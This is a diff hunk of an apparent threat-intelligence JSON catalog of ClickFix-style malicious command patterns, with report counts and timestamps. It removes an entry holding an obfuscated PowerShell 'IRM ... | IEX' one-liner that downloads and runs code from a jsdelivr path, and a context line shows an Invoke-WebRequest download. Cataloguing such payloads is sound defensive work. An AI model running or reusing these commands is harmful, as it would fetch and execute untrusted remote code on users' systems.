@@ -1093,19 +1093,6 @@
     ]
   },
   {
-    "Pattern": "Hex/obfuscated IP delivery: ...ntLoaded', startCallbackPolling); <!-- clickfix-observer-corpus --> IRM c\"d\"n.jsdelivr.net/g\"h\"/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af | IEX IRM c\"d\"n.jsdelivr.net/g\"h\"/447349472...",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-09T21:31:27.980000+00:00",
-    "LastSeen": "2026-11-09T21:31:27.980000+00:00",
-    "ReportIds": [
-      "cmw9s0e8w050u0oml3hvppp7a"
-    ],
-    "PayloadExamples": [
-      "Hex/obfuscated IP delivery: ...ntLoaded', startCallbackPolling); <!-- clickfix-observer-corpus --> IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472638/0845D1a-D29D-43e2-AcD9-356Ea09250ec/d5-b17A-Ee4F8c9323af | IEX IRM c\"d\"n[.]jsdelivr[.]net/g\"h\"/447349472..."
-    ]
-  },
-  {
     "Pattern": "Invoke-WebRequest \"<URL>\" -OutFile $z",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
